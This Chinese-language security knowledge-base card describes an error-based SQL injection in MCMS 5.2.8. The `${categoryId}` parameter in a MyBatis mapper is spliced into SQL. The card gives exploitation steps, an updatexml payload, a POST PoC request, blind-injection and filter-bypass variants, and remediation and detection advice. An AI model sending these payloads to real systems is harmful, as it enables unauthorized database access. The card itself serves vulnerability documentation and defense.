---
id: web-generic-sqli-mcms-content-categoryid-query
title: MCMS 内容列表 categoryId 直接拼进 IContentDao.xml query 的 ${categoryId}，POST 参数可报错注入
type: scenario
domain: web
path: web/generic/sqli
technique: mcms-content-categoryid-sqli
tags:
- sqli
- mybatis
- java
- springboot
- cms
- mcms
- error-based
cve: []
severity: high
confidence: high
affected_versions: MCMS（MingSoft CMS）5.2.8（原文审计版本；其他版本未验证）
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V464
  verified_at: '2026-11-10T15:08:51+08:00'
  notes: 已通读原文；第12节复现截图指向 xzfile.aliyuncs.com 远程图，未包含在本地 img，依正文核对：IContentDao.xml query 中 categoryId、ContentAction#list 为 POST、ContentBean 经 CategoryEntity 绑定 categoryId 与卡一致；payload 按原文 updatexml 闭合方式整理。未验证点：原文路由 /cms/content（后台可能 /ms/cms/content）、实际请求截图缺失；PoC 未复跑；无 sources/source_url。
url: /docs/web/generic/sqli/web-generic-sqli-mcms-content-categoryid-query/
draft: false
kb_aliases:
- MCMS categoryId 注入
- IContentDao.xml ${categoryId}
- ContentAction list 注入
- cms/content SQL 注入
---

## 一句话结论

MCMS 的 `IContentDao.xml` 在 `query` 语句里把 `category_id = ${categoryId}` 直接文本替换，`ContentAction` 的列表接口把前端 `categoryId` 原样传给 `ContentBiz.query`，因此 POST `categoryId=1'and updatexml(1,concat(0x7e,user(),0x7e),1)and '1` 即可闭合条件并报错注入。

## 原理

- **XML 映射**：`net.mingsoft.cms.dao.IContentDao` 继承 `IBaseDao`，其 `query` 语句（`IContentDao.xml`）在 WHERE 条件中使用 `${categoryId}`；`${}` 是 MyBatis 的字符串替换，不是 `#{}` 预编译，用户输入直接进入 SQL。
- **调用链**：`ContentAction#list`（映射 `/cms/content`）→ `contentBiz.query(content)` → `ContentBizImpl` 继承 `BaseBizImpl.query(entity)` → `getDao().query(entity)`；`content` 是 `ContentBean`（父类 `CategoryEntity` 定义 `categoryId` 及 getter/setter），Spring MVC 自动绑定请求参数。
- **为什么能用 POST 打**：列表接口是 `@PostMapping`，参数从请求体绑定；`categoryId` 未做数字校验/过滤，CMS 全局也没有统一的 SQL 注入过滤器。
- **闭合方式**：原语句大概是 `and category_id = ${categoryId}`；payload `1'and updatexml(...)and'1` 把值闭合为 `category_id = 1' and updatexml(...) and '1`，`updatexml` 的 XPath 错误把 `user()` 带进错误信息。
- **与其它 MCMS SQLi 的区别**：本卡是 `IContentDao.xml` 里专属的 `${categoryId}`；另有 `queryBySQL` 的 Map key（`fieldName`）与 `sqlWhereList` 的 `${item.field}`，参数位置不同，修复方式也不同。

## 触发条件

- MCMS 5.2.8，内容列表接口可访问（前台 `/cms/content` 或后台带 `/ms` 前缀的路由，视部署/鉴权）。
- `categoryId` 参数能从请求体绑定到 `ContentBean`，且未被强制转成数字。
- 数据库为 MySQL（`updatexml`/`extractvalue`/`sleep` 可用）；错误信息可能回显（原文为报错注入）。
- 若接口走 `query` 且 `categoryId` 为空/0，可能返回全部内容；注入时需保持语法正确。

## 利用步骤

1. 抓取内容列表请求（`ContentAction#list`，路由 `/cms/content`，通常为 POST）。
2. 在 `categoryId` 中放闭合 payload：`1'and updatexml(1,concat(0x7e,user(),0x7e),1)and'1`。
3. 发送请求，观察响应中的 SQL 错误信息（`XPATH syntax error: '~root@localhost~'`）。
4. 替换 `user()` 为 `database()`、`@@version`、子查询等逐项取数据；或改用时间盲注 `and if(...,sleep(5),1)`。
5. 若引号被过滤，尝试 `\`、宽字节、十六进制/`char()` 拼接（视数据库与字符集）。

## PoC

```http
POST /cms/content HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

categoryId=1'and updatexml(1,concat(0x7e,user(),0x7e),1)and'1
```

后台路由可能为 `/ms/cms/content`；按目标实际 `@RequestMapping` 调整。原文在本地 MCMS 5.2.8 复现，报错回显数据库用户。

## 变体与关联

- 同项目 SQLi：`web-generic-sqli-mcms-querybysql-wheres-key-fieldname`、`web-generic-sqli-mcms-sqlwherelist-field-include`、`web-generic-sqli-mcms-formdata-querydata-orderby`、`web-generic-sqli-mcms-mdiy-dict-orderby-injection`。
- 通用模式：MyBatis XML 中 `${}` 用于值位置时的注入；应改成 `#{}`，无法参数化的列名/表名用白名单。
- 关联 `web-java-component-mcms-dual-route-prefix-auth-bypass`：`/cms/content` 这类不带 `/ms` 前缀的路由可能绕过后台鉴权，未授权即可访问列表接口。

## 检测与防御

- 修复：`IContentDao.xml` 将 `${categoryId}` 改为 `#{categoryId}`；在 Controller 层把 `categoryId` 强制转为数字并校验范围。
- 代码审计：全局搜索 Mapper XML 的 `${`，尤其 `categoryId`、`id`、`orderBy` 等看似“数字”的参数；数字类型也要确认是否被当作字符串拼接。
- 检测：请求体中 `categoryId` 含引号/`updatexml`/`sleep`/注释符；SQL 报错信息回显；内容列表接口异常响应时间。
- 加固：参数化查询、最小权限数据库账号、关闭详细错误、WAF 覆盖内容接口。
